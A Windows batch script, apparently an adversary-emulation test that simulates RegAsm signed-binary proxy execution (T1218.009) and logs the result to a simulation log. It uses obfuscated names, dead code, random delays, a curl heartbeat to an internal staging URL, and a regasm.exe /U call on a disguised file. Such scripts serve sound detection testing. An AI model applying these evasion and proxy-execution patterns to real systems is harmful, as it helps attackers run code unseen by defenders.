@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM PHR constants
SET xqryz=%APPDATA%\8298\3033d2e3
SET zxmqp=https://10.0.0.49
SET vbnxc=https://10.0.0.49/stage/2/icon.png?8298-7
SET pqfgb=ITZEL-S2BO
SET ytrew=7
SET klmnj=onenote.txt
SET mjhgf=8298

REM Log file path
SET logfile=%APPDATA%\!ytrew!\macula-simulations.log

REM Initial random delay
SET /A jxwcb=40 + !RANDOM! %% 31
echo [!DATE! !TIME!][DEBUG][!pqfgb!]: initial_delay_start=!jxwcb!>> "!logfile!" 2>nul
timeout /t !jxwcb! /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!pqfgb!]: initial_delay_complete=1>> "!logfile!" 2>nul

REM State machine initialization
SET kwert=0
GOTO gfddf

REM --- Dead code section (never reached) ---
:pqazx
echo dead_code_1>>nul
SET fake1=value1
GOTO END

:wsxcd
echo dead_code_2>>nul
SET fake2=value2
GOTO END

:edcrf
echo dead_code_3>>nul
SET fake3=value3
GOTO END

REM --- Main dispatch ---
:gfddf
IF !kwert!==0 GOTO lkjhg
IF !kwert!==17 GOTO poiuy
IF !kwert!==42 GOTO trewq
IF !kwert!==99 GOTO mnbvc
IF !kwert!==100 GOTO zxcvb
GOTO END

REM --- State 0: Heartbeat ---
:lkjhg
echo [!DATE! !TIME!][DEBUG][!pqfgb!]: heartbeat_start=1>> "!logfile!" 2>nul
curl -k -s -o nul "!vbnxc!"
IF !ERRORLEVEL!==0 (
    SET hb_result=1
    SET hb_error=
) ELSE (
    SET hb_result=0
    SET hb_error=connection_failed
)
echo [!DATE! !TIME!][DEBUG][!pqfgb!]: heartbeat_complete=!hb_result!>> "!logfile!" 2>nul

REM Fixed delay after heartbeat
echo [!DATE! !TIME!][DEBUG][!pqfgb!]: fixed_delay_start=15>> "!logfile!" 2>nul
CHOICE /C Y /N /D Y /T 15 >nul
echo [!DATE! !TIME!][DEBUG][!pqfgb!]: fixed_delay_complete=1>> "!logfile!" 2>nul

SET kwert=17
GOTO gfddf

REM --- State 17: Change directory ---
:poiuy
echo [!DATE! !TIME!][DEBUG][!pqfgb!]: chdir_start=!xqryz!>> "!logfile!" 2>nul
cd /d "!xqryz!"
IF !ERRORLEVEL!==0 (
    SET cd_result=1
    SET cd_error=
) ELSE (
    SET cd_result=0
    SET cd_error=directory_not_found
)
echo [!DATE! !TIME!][DEBUG][!pqfgb!]: chdir_complete=!cd_result!>> "!logfile!" 2>nul

REM Random delay between operations
SET /A rdelay=5 + !RANDOM! %% 11
echo [!DATE! !TIME!][DEBUG][!pqfgb!]: random_delay_start=!rdelay!>> "!logfile!" 2>nul
ping -n !rdelay! 127.0.0.1 >nul
echo [!DATE! !TIME!][DEBUG][!pqfgb!]: random_delay_complete=1>> "!logfile!" 2>nul

SET kwert=42
GOTO gfddf

REM --- State 42: Prepare execution ---
:trewq
REM Always true condition for obfuscation
IF 1==1 (
    GOTO real_exe
) ELSE (
    GOTO fake_exe
)

:fake_exe
echo fake_execution_path>>nul
EXIT

:real_exe
REM Check if target file exists
IF NOT EXIST "!klmnj!" (
    SET exec_result=0
    SET exec_error=file_not_found
    GOTO log_ttp
)

SET kwert=99
GOTO gfddf

REM --- State 99: Execute regasm ---
:mnbvc
echo [!DATE! !TIME!][DEBUG][!pqfgb!]: regasm_start=!klmnj!>> "!logfile!" 2>nul
SET lolbin=regasm.exe
!lolbin! /U "!klmnj!"
IF !ERRORLEVEL!==0 (
    SET exec_result=1
    SET exec_error=
) ELSE (
    SET exec_result=0
    SET exec_error=regasm_failed
)

REM Log TTP execution
:log_ttp
FOR /f "tokens=1-3 delims=/ " %%a in ("!DATE!") do (
    SET mm=%%a
    SET dd=%%b
    SET yyyy=%%c
)
FOR /f "tokens=1-3 delims=:." %%a in ("!TIME!") do (
    SET hh=%%a
    SET nn=%%b
    SET ss=%%c
    IF "!ss!"=="" SET ss=00
)
SET ms=000
IF "%%d" NEQ "" SET ms=%%d
SET ttp_ts=!yyyy!-!mm!-!dd! !hh!:!nn!:!ss!.!ms!
SET log_line=[!ttp_ts!][!pqfgb!]: !ytrew!-!mjhgf!-T1218.009|RegAsm=!exec_result!:[!exec_error!]
echo !log_line!>> "!logfile!" 2>nul

echo [!DATE! !TIME!][DEBUG][!pqfgb!]: regasm_complete=!exec_result!>> "!logfile!" 2>nul

REM Final delay
echo [!DATE! !TIME!][DEBUG][!pqfgb!]: final_delay_start=5>> "!logfile!" 2>nul
timeout /t 5 /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!pqfgb!]: final_delay_complete=1>> "!logfile!" 2>nul

SET kwert=100
GOTO gfddf

REM --- State 100: Cleanup ---
:zxcvb
echo [!DATE! !TIME!][DEBUG][!pqfgb!]: script_end=1>> "!logfile!" 2>nul
REM Cleanup environment variables
SET xqryz=
SET zxmqp=
SET vbnxc=
SET pqfgb=
SET ytrew=
SET klmnj=
SET mjhgf=
SET logfile=

REM More dead code
:asdfg
echo dead_code_4>>nul
GOTO END

:qwert
echo dead_code_5>>nul
GOTO END

:END
ENDLOCAL